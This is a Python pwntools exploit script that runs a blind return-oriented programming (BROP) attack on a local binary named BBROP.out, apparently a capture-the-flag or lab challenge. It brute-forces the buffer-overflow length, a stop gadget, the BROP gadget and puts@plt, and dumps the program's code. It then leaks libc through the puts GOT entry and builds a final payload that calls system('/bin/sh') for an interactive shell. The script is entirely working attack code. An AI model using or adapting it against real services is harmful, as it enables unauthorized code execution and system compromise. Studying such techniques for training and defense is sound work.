from pwn import *
from LibcSearcher import *


def get_bufferflow_lenth():
    i = 1
    while True:
        try:
            sh = process('./BBROP.out')
            sh.recvuntil('WelCome my friend,Do you know password?\n')
            sh.send('a' * i)
            if not sh.recv().startswith('No password'):
                return i - 1
            else:
                i += 1
        except Exception:
            return i - 1
        finally:
            sh.close()


def get_stopGadgets():
    addr = 0x400000
    while True:
        try:
            sh = process('./BBROP.out')
            sh.recvuntil('password?\n')
            payload = 'a' * bufferflow_lenth + p64(addr)
            sh.sendline(payload)
            sh.recv()
            print('one success addr: {0}'.format(hex(addr)))
            return addr
        except Exception:
            addr += 1
        finally:
            sh.close()


def get_bropGadgets():
    addr = 0x400000
    while True:
        try:
            print('Try bropGadgets: {0}'.format(hex(addr)))
            sh = process('./BBROP.out')
            sh.recvuntil('password?\n')
            payload = 'a' * bufferflow_lenth + p64(addr) + p64(0) * 6 + \
                p64(stopGadgets_addr) + p64(0) * 10
            sh.sendline(payload)
            content = sh.recv(timeout=3)
            sh.close()
            if content.startswith('WelCome'):
                if check_bropGadget(addr):
                    return addr
            addr += 1
        except Exception:
            sh.close()
            addr += 1


def check_bropGadget(addr):
    try:
        sh = process('./BBROP.out')
        sh.recvuntil('password?\n')
        payload = 'a' * bufferflow_lenth + p64(addr) + 'a' * 8 * 10
        sh.sendline(payload)
        sh.recv()
        sh.close()
        return False
    except Exception:
        sh.close()
        return True


def get_puts_plt():
    addr = 0x400500
    while True:
        print('Try get puts@plt: {0}'.format(hex(addr)))
        sh = process('./BBROP.out')
        sh.recvuntil('password?\n')
        payload = 'a' * bufferflow_lenth + p64(pop_rdi_ret) + p64(0x400000) + \
            p64(addr) + p64(stopGadgets_addr)
        sh.sendline(payload)
        try:
            content = sh.recv(timeout=3)
            if content.startswith('\x7fELF'):
                print('find puts@plt addr: {0}'.format(hex(addr)))
                return addr
            sh.close()
            addr += 1
        except Exception:
            sh.close()
            addr += 1


def leak_to_code():
    leak_addr = 0x400000
    result = ''
    while leak_addr < 0x401000:
        print('leak at: {0}'.format(hex(leak_addr)))
        sh = process('./BBROP.out')
        payload = 'a' * bufferflow_lenth + p64(pop_rdi_ret) + p64(leak_addr) + \
            p64(puts_plt_addr) + p64(stopGadgets_addr)
        sh.sendlineafter('password?\n', payload)
        try:
            data = sh.recv()
            sh.close()
            try:
                code = data[:data.index('\nWelCome')]
            except Exception:
                code = data
            if code == "":
                code = '\x00'
            result += code
            leak_addr += len(code)
        except Exception:
            sh.close()
            print('leak error: {0}'.format(hex(leak_addr)))
            return None
    with open('code', 'wb') as target:
        target.write(result)



# bufferflow_lenth = get_bufferflow_lenth()
bufferflow_lenth = 72

# stopGadgets_addr = get_stopGadgets()
stopGadgets_addr = 0x4005D0

# bropGadgets_addr = get_bropGadgets()
bropGadgets_addr = 0x4007ba

pop_rdi_ret = bropGadgets_addr + 9

# puts_plt_addr = get_puts_plt()
puts_plt_addr = 0x400565

# leak_to_code()
puts_got = 0x601018

sh = process('./BBROP.out')
payload = 'a' * bufferflow_lenth + p64(pop_rdi_ret) + p64(puts_got) + \
    p64(puts_plt_addr) + p64(stopGadgets_addr)
sh.sendlineafter('password?\n', payload)
data = sh.recvuntil('\nWelCome', drop=True)
puts_addr = u64(data.ljust(8, '\x00'))
print(hex(puts_addr))
libc = LibcSearcher('puts', puts_addr)
libcbase = puts_addr - libc.dump('puts')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')
payload = 'a' * bufferflow_lenth + p64(pop_rdi_ret) + p64(binsh_addr) + \
    p64(system_addr) + p64(stopGadgets_addr)
sh.sendline(payload)
sh.interactive()
